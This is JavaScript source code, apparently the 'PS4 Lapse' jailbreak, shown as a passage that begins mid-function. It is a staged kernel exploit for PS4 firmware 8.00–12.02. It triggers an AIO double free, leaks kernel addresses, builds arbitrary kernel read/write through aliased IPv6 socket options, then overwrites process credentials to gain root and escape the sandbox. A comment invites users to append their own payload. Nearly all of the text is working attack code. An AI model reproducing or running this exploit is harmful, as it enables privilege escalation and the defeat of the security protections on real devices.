        if (poll_res !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
            aio_multi_delete(req_addr, 1, sce_errs);
            won_race = true;
        }

        syscall(SYSCALL.thr_resume_ucontext, thr_tid);
        nanosleep(5);

        if (won_race) {
            const err_main_thr = read32_uncompressed(sce_errs);
            const err_worker_thr = read32_uncompressed(sce_errs + 4n);

            if (err_main_thr === err_worker_thr && err_main_thr === 0n) {
                const sd_pair = make_aliased_rthdrs(sds);

                if (sd_pair !== null) {
                    syscall(SYSCALL.close, pipe_read_fd);
                    syscall(SYSCALL.close, pipe_write_fd);
                    return sd_pair;
                }
            }
        }

        syscall(SYSCALL.close, pipe_read_fd);
        syscall(SYSCALL.close, pipe_write_fd);
        return null;

    } catch (e) {
        logger.log("  race_one error: " + e.message);
        return null;
    }
}


/***** lapse_stages.js *****/

/*
    PS4 Lapse - Exploit Stage Functions (Stages 2-4)

    Stage 2: Leak kernel addresses
    Stage 3: Double free SceKernelAioRWRequest
    Stage 4: Get arbitrary kernel read/write
*/

// === Stage 2 Functions ===

function new_evf(name, flags) {
    const result = syscall(SYSCALL.evf_create, name, 0n, flags);
    if (result === 0xffffffffffffffffn) {
        throw new Error("evf_create error: " + hex(result));
    }
    return result;
}

function set_evf_flags(id, flags) {
    let result = syscall(SYSCALL.evf_clear, id, 0n);
    if (result === 0xffffffffffffffffn) {
        throw new Error("evf_clear error: " + hex(result));
    }
    result = syscall(SYSCALL.evf_set, id, flags);
    if (result === 0xffffffffffffffffn) {
        throw new Error("evf_set error: " + hex(result));
    }
    return result;
}

function free_evf(id) {
    const result = syscall(SYSCALL.evf_delete, id);
    if (result === 0xffffffffffffffffn) {
        throw new Error("evf_delete error: " + hex(result));
    }
    return result;
}

function verify_reqs2(addr, cmd) {
    if (read32_uncompressed(addr) !== cmd) {
        return false;
    }

    const heap_prefixes = [];

    for (let i = 0x10n; i <= 0x20n; i += 8n) {
        if (read16_uncompressed(addr + i + 6n) !== 0xffffn) {
            return false;
        }
        heap_prefixes.push(Number(read16_uncompressed(addr + i + 4n)));
    }

    const state1 = Number(read32_uncompressed(addr + 0x38n));
    const state2 = Number(read32_uncompressed(addr + 0x3cn));
    if (!(state1 > 0 && state1 <= 4) || state2 !== 0) {
        return false;
    }

    if (read64_uncompressed(addr + 0x40n) !== 0n) {
        return false;
    }

    for (let i = 0x48n; i <= 0x50n; i += 8n) {
        if (read16_uncompressed(addr + i + 6n) === 0xffffn) {
            if (read16_uncompressed(addr + i + 4n) !== 0xffffn) {
                heap_prefixes.push(Number(read16_uncompressed(addr + i + 4n)));
            }
        } else if (i === 0x50n || read64_uncompressed(addr + i) !== 0n) {
            return false;
        }
    }

    if (heap_prefixes.length < 2) {
        return false;
    }

    const first_prefix = heap_prefixes[0];
    for (let idx = 1; idx < heap_prefixes.length; idx++) {
        if (heap_prefixes[idx] !== first_prefix) {
            return false;
        }
    }

    return true;
}

function leak_kernel_addrs(sd_pair, sds) {
    const sd = sd_pair[0];
    const buflen = 0x80 * LEAK_LEN;
    const buf = malloc(buflen);

    logger.log("Confusing evf with rthdr...");

    const name = malloc(1);

    syscall(SYSCALL.close, BigInt(sd_pair[1]));

    let evf = null;
    for (let i = 1; i <= NUM_ALIAS; i++) {
        const evfs = [];

        for (let j = 1; j <= NUM_HANDLES; j++) {
            const evf_flags = 0xf00n | (BigInt(j) << 16n);
            evfs.push(new_evf(name, evf_flags));
        }

        get_rthdr(sd, buf, 0x80);

        const flag = Number(read32_uncompressed(buf));

        if ((flag & 0xf00) === 0xf00) {
            const idx = (flag >>> 16) & 0xffff;
            const expected_flag = BigInt(flag | 1);

            evf = evfs[idx - 1];

            set_evf_flags(evf, expected_flag);
            get_rthdr(sd, buf, 0x80);

            const val = read32_uncompressed(buf);
            if (val === expected_flag) {
                evfs.splice(idx - 1, 1);
            } else {
                evf = null;
            }
        }

        for (let k = 0; k < evfs.length; k++) {
            if (evf === null || evfs[k] !== evf) {
                free_evf(evfs[k]);
            }
        }

        if (evf !== null) {
            logger.log("Confused rthdr and evf at attempt: " + i);
            break;
        }
    }

    if (evf === null) {
        logger.log("Failed to confuse evf and rthdr");
        return null;
    }

    set_evf_flags(evf, 0xff00n);

    const kernel_addr = read64_uncompressed(buf + 0x28n);
    logger.log("\"evf cv\" string addr: " + hex(kernel_addr));

    const kbuf_addr = read64_uncompressed(buf + 0x40n) - 0x38n;
    logger.log("Kernel buffer addr: " + hex(kbuf_addr));

    const wbufsz = 0x80;
    const wbuf = malloc(wbufsz);
    const rsize = build_rthdr(wbuf, wbufsz);
    const marker_val = 0xdeadbeefn;
    const reqs3_offset = 0x10n;

    write32_uncompressed(wbuf + 4n, marker_val);
    write32_uncompressed(wbuf + reqs3_offset + 0n, 1n);
    write32_uncompressed(wbuf + reqs3_offset + 4n, 0n);
    write32_uncompressed(wbuf + reqs3_offset + 8n, AIO_STATE_COMPLETE);
    write8_uncompressed(wbuf + reqs3_offset + 0xcn, 0n);
    write32_uncompressed(wbuf + reqs3_offset + 0x28n, 0x67b0000n);
    write64_uncompressed(wbuf + reqs3_offset + 0x38n, 1n);

    const num_elems = 6;
    const ucred = kbuf_addr + 4n;
    const leak_reqs = make_reqs1(num_elems);
    write64_uncompressed(leak_reqs + 0x10n, ucred);

    const num_loop = NUM_SDS;
    const leak_ids_len = num_loop * num_elems;
    const leak_ids = malloc(4 * leak_ids_len);
    const step = BigInt(4 * num_elems);
    const cmd = AIO_CMD_WRITE | AIO_CMD_FLAG_MULTI;

    let reqs2_off = null;
    let fake_reqs3_off = null;
    let fake_reqs3_sd = null;

    for (let i = 1; i <= NUM_LEAKS; i++) {
        for (let j = 1; j <= num_loop; j++) {
            write32_uncompressed(wbuf + 8n, BigInt(j));
            aio_submit_cmd(cmd, leak_reqs, num_elems, 3n, leak_ids + (BigInt(j - 1) * step));
            set_rthdr(Number(sds[j - 1]), wbuf, rsize);
        }

        get_rthdr(sd, buf, buflen);

        let sd_idx = null;
        reqs2_off = null;
        fake_reqs3_off = null;

        for (let off = 0x80; off < buflen; off += 0x80) {
            const offset = BigInt(off);

            if (reqs2_off === null && verify_reqs2(buf + offset, AIO_CMD_WRITE)) {
                reqs2_off = off;
            }

            if (fake_reqs3_off === null) {
                const marker = read32_uncompressed(buf + offset + 4n);
                if (marker === marker_val) {
                    fake_reqs3_off = off;
                    sd_idx = Number(read32_uncompressed(buf + offset + 8n));
                }
            }
        }

        if (reqs2_off !== null && fake_reqs3_off !== null) {
            logger.log("Found reqs2 and fake reqs3 at attempt: " + i);
            fake_reqs3_sd = sds[sd_idx - 1];
            sds.splice(sd_idx - 1, 1);
            free_rthdrs(sds);
            sds.push(new_socket());
            break;
        }

        free_aios(leak_ids, leak_ids_len);
    }

    if (reqs2_off === null || fake_reqs3_off === null) {
        logger.log("Could not leak reqs2 and fake reqs3");
        logger.flush();
        return null;
    }

    logger.log("reqs2 offset: " + hex(BigInt(reqs2_off)));
    logger.log("fake reqs3 offset: " + hex(BigInt(fake_reqs3_off)));
    logger.flush();

    get_rthdr(sd, buf, buflen);

    const aio_info_addr = read64_uncompressed(buf + BigInt(reqs2_off) + 0x18n);

    let reqs1_addr = read64_uncompressed(buf + BigInt(reqs2_off) + 0x10n);
    reqs1_addr = reqs1_addr & ~0xffn;

    const fake_reqs3_addr = kbuf_addr + BigInt(fake_reqs3_off) + reqs3_offset;

    logger.log("reqs1_addr = " + hex(reqs1_addr));
    logger.log("fake_reqs3_addr = " + hex(fake_reqs3_addr));

    logger.log("Searching for target_id...");
    logger.flush();

    let target_id = null;
    let to_cancel = null;
    let to_cancel_len = null;

    const errors = malloc(4 * num_elems);

    for (let i = 0; i < leak_ids_len; i += num_elems) {
        aio_multi_cancel(leak_ids + BigInt(i * 4), num_elems, errors);
        get_rthdr(sd, buf, buflen);

        const state = read32_uncompressed(buf + BigInt(reqs2_off) + 0x38n);
        if (state === AIO_STATE_ABORTED) {
            target_id = read32_uncompressed(leak_ids + BigInt(i * 4));
            write32_uncompressed(leak_ids + BigInt(i * 4), 0n);

            logger.log("Found target_id=" + hex(target_id) + ", i=" + i + ", batch=" + Math.floor(i / num_elems));
            logger.flush();
            const start = i + num_elems;
            to_cancel = leak_ids + BigInt(start * 4);
            to_cancel_len = leak_ids_len - start;

            break;
        }
    }

    if (target_id === null) {
        logger.log("Target ID not found");
        logger.flush();
        return null;
    }

    cancel_aios(to_cancel, to_cancel_len);
    free_aios2(leak_ids, leak_ids_len);

    logger.log("Kernel addresses leaked successfully!");
    logger.flush();

    return {
        reqs1_addr: reqs1_addr,
        kbuf_addr: kbuf_addr,
        kernel_addr: kernel_addr,
        target_id: target_id,
        evf: evf,
        fake_reqs3_addr: fake_reqs3_addr,
        fake_reqs3_sd: fake_reqs3_sd,
        aio_info_addr: aio_info_addr
    };
}

// === Stage 3 Functions ===

function make_aliased_pktopts(sds) {
    const tclass = malloc(4);

    for (let loop = 0; loop < NUM_ALIAS; loop++) {
        for (let i = 0; i < sds.length; i++) {
            write32_uncompressed(tclass, BigInt(i));
            set_sockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
        }

        for (let i = 0; i < sds.length; i++) {
            get_sockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
            const marker = Number(read32_uncompressed(tclass));

            if (marker !== i) {
                const sd_pair = [sds[i], sds[marker]];
                logger.log("Aliased pktopts at attempt " + loop + " (pair: " + sd_pair[0] + ", " + sd_pair[1] + ")");
                logger.flush();
                if (marker > i) {
                    sds.splice(marker, 1);
                    sds.splice(i, 1);
                } else {
                    sds.splice(i, 1);
                    sds.splice(marker, 1);
                }

                for (let j = 0; j < 2; j++) {
                    const sock_fd = new_socket();
                    set_sockopt(sock_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                    sds.push(sock_fd);
                }

                return sd_pair;
            }
        }

        for (let i = 0; i < sds.length; i++) {
            set_sockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0n, 0);
        }
    }

    return null;
}

function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_reqs3_addr) {
    const max_leak_len = (0xff + 1) << 3;
    const buf = malloc(max_leak_len);

    const num_elems = MAX_AIO_IDS;
    const aio_reqs = make_reqs1(num_elems);

    const num_batches = 2;
    const aio_ids_len = num_batches * num_elems;
    const aio_ids = malloc(4 * aio_ids_len);

    logger.log("Overwriting rthdr with AIO queue entry...");
    logger.flush();
    let aio_not_found = true;
    free_evf(evf);

    for (let i = 0; i < NUM_CLOBBERS; i++) {
        spray_aio(num_batches, aio_reqs, num_elems, aio_ids, true);

        const size_ret = get_rthdr(sd, buf, max_leak_len);
        const cmd = read32_uncompressed(buf);

        if (size_ret === 8n && cmd === AIO_CMD_READ) {
            logger.log("Aliased at attempt " + i);
            logger.flush();
            aio_not_found = false;
            cancel_aios(aio_ids, aio_ids_len);
            break;
        }

        free_aios(aio_ids, aio_ids_len, true);
    }

    if (aio_not_found) {
        logger.log("Failed to overwrite rthdr");
        logger.flush();
        return null;
    }

    const reqs2_size = 0x80;
    const reqs2 = malloc(reqs2_size);
    const rsize = build_rthdr(reqs2, reqs2_size);

    write32_uncompressed(reqs2 + 4n, 5n);
    write64_uncompressed(reqs2 + 0x18n, reqs1_addr);
    write64_uncompressed(reqs2 + 0x20n, fake_reqs3_addr);

    const states = malloc(4 * num_elems);
    const addr_cache = [];
    for (let i = 0; i < num_batches; i++) {
        addr_cache.push(aio_ids + BigInt(i * num_elems * 4));
    }

    logger.log("Overwriting AIO queue entry with rthdr...");
    logger.flush();

    syscall(SYSCALL.close, BigInt(sd));
    sd = null;

    function overwrite_aio_entry_with_rthdr() {
        for (let i = 0; i < NUM_ALIAS; i++) {
            for (let j = 0; j < sds.length; j++) {
                set_rthdr(sds[j], reqs2, rsize);
            }

            for (let batch = 0; batch < addr_cache.length; batch++) {
                for (let j = 0; j < num_elems; j++) {
                    write32_uncompressed(states + BigInt(j * 4), -1n);
                }

                aio_multi_cancel(addr_cache[batch], num_elems, states);

                let req_idx = -1;
                for (let j = 0; j < num_elems; j++) {
                    const val = read32_uncompressed(states + BigInt(j * 4));
                    if (val === AIO_STATE_COMPLETE) {
                        req_idx = j;
                        break;
                    }
                }

                if (req_idx !== -1) {
                    logger.log("Found req_id at batch " + batch + ", attempt " + i);
                    logger.flush();

                    const aio_idx = batch * num_elems + req_idx;
                    const req_id_p = aio_ids + BigInt(aio_idx * 4);
                    const req_id = read32_uncompressed(req_id_p);

                    aio_multi_poll(req_id_p, 1, states);
                    write32_uncompressed(req_id_p, 0n);

                    return req_id;
                }
            }
        }

        return null;
    }

    const req_id = overwrite_aio_entry_with_rthdr();
    if (req_id === null) {
        logger.log("Failed to overwrite AIO queue entry");
        logger.flush();
        return null;
    }

    free_aios2(aio_ids, aio_ids_len);

    const target_id_p = malloc(4);
    write32_uncompressed(target_id_p, BigInt(target_id));

    aio_multi_poll(target_id_p, 1, states);

    const sce_errs = malloc(8);
    write32_uncompressed(sce_errs, -1n);
    write32_uncompressed(sce_errs + 4n, -1n);

    const target_ids = malloc(8);
    write32_uncompressed(target_ids, req_id);
    write32_uncompressed(target_ids + 4n, BigInt(target_id));

    logger.log("Triggering double free...");
    logger.flush();
    aio_multi_delete(target_ids, 2, sce_errs);

    logger.log("Reclaiming memory...");
    logger.flush();
    const sd_pair = make_aliased_pktopts(sds_alt);

    const err1 = read32_uncompressed(sce_errs);
    const err2 = read32_uncompressed(sce_errs + 4n);

    write32_uncompressed(states, -1n);
    write32_uncompressed(states + 4n, -1n);

    aio_multi_poll(target_ids, 2, states);

    let success = true;
    if (read32_uncompressed(states) !== SCE_KERNEL_ERROR_ESRCH) {
        logger.log("ERROR: Bad delete of corrupt AIO request");
        logger.flush();
        success = false;
    }

    if (err1 !== 0n || err1 !== err2) {
        logger.log("ERROR: Bad delete of ID pair");
        logger.flush();
        success = false;
    }

    if (!success) {
        logger.log("Double free failed");
        logger.flush();
        return null;
    }

    if (sd_pair === null) {
        logger.log("Failed to make aliased pktopts");
        logger.flush();
        return null;
    }

    return sd_pair;
}

// === Stage 4 Functions ===

function make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio_info_addr) {
    try {
        const master_sock = pktopts_sds[0];
        const tclass = malloc(4);
        const off_tclass = kernel_offset.IP6PO_TCLASS;

        const pktopts_size = 0x100;
        const pktopts = malloc(pktopts_size);
        const rsize = build_rthdr(pktopts, pktopts_size);
        const pktinfo_p = reqs1_addr + 0x10n;

        write64_uncompressed(pktopts + 0x10n, pktinfo_p);

        logger.log("Overwriting main pktopts");
        logger.flush();
        let reclaim_sock = null;

        syscall(SYSCALL.close, pktopts_sds[1]);

        for (let i = 1; i <= NUM_ALIAS; i++) {
            for (let j = 0; j < sds_alt.length; j++) {
                write32_uncompressed(pktopts + off_tclass, 0x4141n | (BigInt(j) << 16n));
                set_rthdr(sds_alt[j], pktopts, rsize);
            }

            get_sockopt(master_sock, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
            const marker = read32_uncompressed(tclass);
            if ((marker & 0xffffn) === 0x4141n) {
                logger.log("Found reclaim socket at attempt: " + i);
                logger.flush();
                const idx = Number(marker >> 16n);
                reclaim_sock = sds_alt[idx];
                sds_alt.splice(idx, 1);
                break;
            }
        }

        if (reclaim_sock === null) {
            logger.log("Failed to overwrite main pktopts");
            logger.flush();
            return null;
        }

        const pktinfo_len = 0x14;
        const pktinfo = malloc(pktinfo_len);
        write64_uncompressed(pktinfo, pktinfo_p);

        const read_buf = malloc(8);

        function slow_kread8(addr) {
            const len = 8;
            let offset = 0;

            while (offset < len) {
                write64_uncompressed(pktinfo + 8n, addr + BigInt(offset));

                set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                const n = get_sockopt(master_sock, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf + BigInt(offset), len - offset);

                if (n === 0n) {
                    write8_uncompressed(read_buf + BigInt(offset), 0n);
                    offset = offset + 1;
                } else {
                    offset = offset + Number(n);
                }
            }

            return read64_uncompressed(read_buf);
        }

        const test_read = slow_kread8(kernel_addr);
        logger.log("slow_kread8(\"evf cv\"): " + hex(test_read));
        logger.flush();
        const kstr = read_cstring(read_buf);
        logger.log("*(\"evf cv\"): " + kstr);
        logger.flush();

        if (kstr !== "evf cv") {
            logger.log("Test read of \"evf cv\" failed");
            logger.flush();
            return null;
        }

        logger.log("Slow arbitrary kernel read achieved");
        logger.flush();

        const curproc = slow_kread8(aio_info_addr + 8n);

        if (Number(curproc >> 48n) !== 0xffff) {
            logger.log("Invalid curproc kernel address: " + hex(curproc));
            logger.flush();
            return null;
        }

        const possible_pid = slow_kread8(curproc + kernel_offset.PROC_PID);
        const current_pid = syscall(SYSCALL.getpid);

        if ((possible_pid & 0xffffffffn) !== (current_pid & 0xffffffffn)) {
            logger.log("curproc verification failed: " + hex(curproc));
            logger.flush();
            return null;
        }

        logger.log("curproc = " + hex(curproc));
        logger.flush();

        kernel.addr.curproc = curproc;
        kernel.addr.curproc_fd = slow_kread8(kernel.addr.curproc + kernel_offset.PROC_FD);
        kernel.addr.curproc_ofiles = slow_kread8(kernel.addr.curproc_fd) + kernel_offset.FILEDESC_OFILES;
        kernel.addr.inside_kdata = kernel_addr;

        function get_fd_data_addr(sock, kread8_fn) {
            const filedescent_addr = kernel.addr.curproc_ofiles + sock * kernel_offset.SIZEOF_OFILES;
            const file_addr = kread8_fn(filedescent_addr + 0x0n);
            return kread8_fn(file_addr + 0x0n);
        }

        function get_sock_pktopts(sock, kread8_fn) {
            const fd_data = get_fd_data_addr(sock, kread8_fn);
            const pcb = kread8_fn(fd_data + kernel_offset.SO_PCB);
            const pktopts = kread8_fn(pcb + kernel_offset.INPCB_PKTOPTS);
            return pktopts;
        }

        const worker_sock = new_socket();
        const worker_pktinfo = malloc(pktinfo_len);

        set_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, worker_pktinfo, pktinfo_len);

        const worker_pktopts = get_sock_pktopts(worker_sock, slow_kread8);

        write64_uncompressed(pktinfo, worker_pktopts + 0x10n);
        write64_uncompressed(pktinfo + 8n, 0n);
        set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);

        function kread20(addr, buf) {
            write64_uncompressed(pktinfo, addr);
            set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
            get_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len);
        }

        function kwrite20(addr, buf) {
            write64_uncompressed(pktinfo, addr);
            set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
            set_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len);
        }

        function kread8(addr) {
            kread20(addr, worker_pktinfo);
            return read64_uncompressed(worker_pktinfo);
        }

        function restricted_kwrite8(addr, val) {
            write64_uncompressed(worker_pktinfo, val);
            write64_uncompressed(worker_pktinfo + 8n, 0n);
            write32_uncompressed(worker_pktinfo + 16n, 0n);
            kwrite20(addr, worker_pktinfo);
        }

        write64_uncompressed(read_buf, kread8(kernel_addr));
        const kstr2 = read_cstring(read_buf);
        if (kstr2 !== "evf cv") {
            logger.log("Test read of \"evf cv\" failed");
            logger.flush();
            return null;
        }

        logger.log("Restricted kernel r/w achieved");
        logger.flush();

        ipv6_kernel_rw.init(kernel.addr.curproc_ofiles, kread8, restricted_kwrite8);

        kernel.read_buffer = ipv6_kernel_rw.read_buffer;
        kernel.write_buffer = ipv6_kernel_rw.write_buffer;
        kernel.copyout = ipv6_kernel_rw.copyout;
        kernel.copyin = ipv6_kernel_rw.copyin;

        const kstr3 = kernel.read_null_terminated_string(kernel_addr);
        if (kstr3 !== "evf cv") {
            logger.log("Test read of \"evf cv\" failed");
            logger.flush();
            return null;
        }

        logger.log("Arbitrary kernel r/w achieved!");
        logger.flush();

        const off_ip6po_rthdr = kernel_offset.IP6PO_RTHDR;

        for (let i = 0; i < sds.length; i++) {
            const sock_pktopts = get_sock_pktopts(sds[i], kernel.read_qword);
            kernel.write_qword(sock_pktopts + off_ip6po_rthdr, 0n);
        }

        const reclaimer_pktopts = get_sock_pktopts(reclaim_sock, kernel.read_qword);

        kernel.write_qword(reclaimer_pktopts + off_ip6po_rthdr, 0n);
        kernel.write_qword(worker_pktopts + off_ip6po_rthdr, 0n);

        const sock_increase_ref = [
            ipv6_kernel_rw.data.master_sock,
            ipv6_kernel_rw.data.victim_sock,
            master_sock,
            worker_sock,
            reclaim_sock
        ];

        for (const each of sock_increase_ref) {
            const sock_addr = get_fd_data_addr(each, kernel.read_qword);
            kernel.write_dword(sock_addr + 0x0n, 0x100n);
        }

        logger.log("Fixes applied");
        logger.flush();

        return true;

    } catch (e) {
        logger.log("make_kernel_arw error: " + e.message);
        logger.log(e.stack);
        return null;
    }
}


/***** lapse_main.js *****/

/*
    PS4 Lapse - Main Execution

    Runs stages 0-5 (jailbreak), then calls run_payload() if defined.
    Append your payload after this file to chain execution.
*/

// === Main Execution ===

(function() {
    try {
        logger.log("=== PS4 Lapse Jailbreak ===");
        logger.flush();

        FW_VERSION = get_fwversion();
        logger.log("Detected PS4 firmware: " + FW_VERSION);
        logger.flush();

        function compare_version(a, b) {
            const [amaj, amin] = a.split('.').map(Number);
            const [bmaj, bmin] = b.split('.').map(Number);
            return amaj === bmaj ? amin - bmin : amaj - bmaj;
        }

        if (compare_version(FW_VERSION, "8.00") < 0 || compare_version(FW_VERSION, "12.02") > 0) {
            logger.log("Unsupported PS4 firmware\nSupported: 8.00-12.02\nAborting...");
            logger.flush();
            send_notification("Unsupported PS4 firmware\nAborting...");
            return;
        }

        kernel_offset = get_kernel_offset(FW_VERSION);
        logger.log("Kernel offsets loaded for FW " + FW_VERSION);
        logger.flush();

        // === STAGE 0: Setup ===
        logger.log("\n=== STAGE 0: Setup ===");
        const setup_success = setup();
        if (!setup_success) {
            logger.log("Setup failed");
            send_notification("Lapse: Setup failed");
            return;
        }
        logger.log("Setup completed");
        logger.flush();

        // === STAGE 1 ===
        logger.log("\n=== STAGE 1: Double-free AIO ===");
        const stage1_start = Date.now();
        const sd_pair = double_free_reqs2();
        const stage1_time = Date.now() - stage1_start;

        if (sd_pair === null) {
            logger.log("[FAILED] Stage 1");
            send_notification("Lapse: FAILED at Stage 1");
            return;
        }
        logger.log("[OK] Stage 1: " + stage1_time + "ms");
        logger.flush();

        // === STAGE 2 ===
        logger.log("\n=== STAGE 2: Leak kernel addresses ===");
        const stage2_start = Date.now();
        const leak_result = leak_kernel_addrs(sd_pair, sds);
        const stage2_time = Date.now() - stage2_start;

        if (leak_result === null) {
            logger.log("[FAILED] Stage 2");
            send_notification("Lapse: FAILED at Stage 2");
            return;
        }
        logger.log("[OK] Stage 2: " + stage2_time + "ms");
        logger.flush();

        // === STAGE 3 ===
        logger.log("\n=== STAGE 3: Double free SceKernelAioRWRequest ===");
        const stage3_start = Date.now();
        const pktopts_sds = double_free_reqs1(
            leak_result.reqs1_addr,
            leak_result.target_id,
            leak_result.evf,
            sd_pair[0],
            sds,
            sds_alt,
            leak_result.fake_reqs3_addr
        );
        const stage3_time = Date.now() - stage3_start;

        syscall(SYSCALL.close, BigInt(leak_result.fake_reqs3_sd));

        if (pktopts_sds === null) {
            logger.log("[FAILED] Stage 3");
            send_notification("Lapse: FAILED at Stage 3");
            return;
        }
        logger.log("[OK] Stage 3: " + stage3_time + "ms");
        logger.flush();

        // === STAGE 4 ===
        logger.log("\n=== STAGE 4: Get arbitrary kernel read/write ===");
        const stage4_start = Date.now();
        const arw_result = make_kernel_arw(
            pktopts_sds,
            leak_result.reqs1_addr,
            leak_result.kernel_addr,
            sds,
            sds_alt,
            leak_result.aio_info_addr
        );
        const stage4_time = Date.now() - stage4_start;

        if (arw_result === null) {
            logger.log("[FAILED] Stage 4");
            send_notification("Lapse: FAILED at Stage 4");
            return;
        }
        logger.log("[OK] Stage 4: " + stage4_time + "ms");
        logger.flush();

        // === STAGE 5: Jailbreak ===
        logger.log("\n=== STAGE 5: Jailbreak ===");
        const stage5_start = Date.now();

        const OFFSET_P_UCRED = 0x40n;
        const proc = kernel.addr.curproc;

        // Calculate kernel base
        kernel.addr.base = kernel.addr.inside_kdata - kernel_offset.EVF_OFFSET;
        logger.log("Kernel base: " + hex(kernel.addr.base));

        const uid_before = Number(syscall(SYSCALL.getuid));
        const sandbox_before = Number(syscall(SYSCALL.is_in_sandbox));
        logger.log("BEFORE: uid=" + uid_before + ", sandbox=" + sandbox_before);

        // Patch ucred
        const proc_fd = kernel.read_qword(proc + kernel_offset.PROC_FD);
        const ucred = kernel.read_qword(proc + OFFSET_P_UCRED);

        kernel.write_dword(ucred + 0x04n, 0n);  // cr_uid
        kernel.write_dword(ucred + 0x08n, 0n);  // cr_ruid
        kernel.write_dword(ucred + 0x0Cn, 0n);  // cr_svuid
        kernel.write_dword(ucred + 0x10n, 1n);  // cr_ngroups
        kernel.write_dword(ucred + 0x14n, 0n);  // cr_rgid

        const prison0 = kernel.read_qword(kernel.addr.base + kernel_offset.PRISON0);
        kernel.write_qword(ucred + 0x30n, prison0);

        kernel.write_qword(ucred + 0x60n, 0xFFFFFFFFFFFFFFFFn);  // sceCaps
        kernel.write_qword(ucred + 0x68n, 0xFFFFFFFFFFFFFFFFn);

        const rootvnode = kernel.read_qword(kernel.addr.base + kernel_offset.ROOTVNODE);
        kernel.write_qword(proc_fd + 0x10n, rootvnode);  // fd_rdir
        kernel.write_qword(proc_fd + 0x18n, rootvnode);  // fd_jdir

        const uid_after = Number(syscall(SYSCALL.getuid));
        const sandbox_after = Number(syscall(SYSCALL.is_in_sandbox));
        logger.log("AFTER:  uid=" + uid_after + ", sandbox=" + sandbox_after);

        if (uid_after === 0 && sandbox_after === 0) {
            logger.log("Sandbox escape complete!");
        } else {
            logger.log("[WARNING] Sandbox escape may have failed");
        }
        logger.flush();

        // === Apply kernel patches via kexec ===
        // Uses syscall_raw() which sets rax manually for syscalls without gadgets
        logger.log("Applying kernel patches...");
        logger.flush();
        const kpatch_result = apply_kernel_patches(FW_VERSION);
        if (kpatch_result) {
            logger.log("Kernel patches applied successfully!");
        } else {
            logger.log("[WARNING] Kernel patches failed - continuing without patches");
        }

        const stage5_time = Date.now() - stage5_start;
        logger.log("[OK] Stage 5: " + stage5_time + "ms - JAILBROKEN");
        logger.flush();

        const total_time = stage1_time + stage2_time + stage3_time + stage4_time + stage5_time;
        logger.log("\n========================================");
        logger.log("  JAILBREAK COMPLETE! Total: " + total_time + "ms");
        logger.log("========================================");
        logger.flush();

        send_notification("Jailbreak OK!");

    } catch (e) {
        logger.log("Lapse Error: " + e.message);
        logger.log(e.stack);
        logger.flush();
        send_notification("Lapse: ERROR - " + e.message);
    }
})();

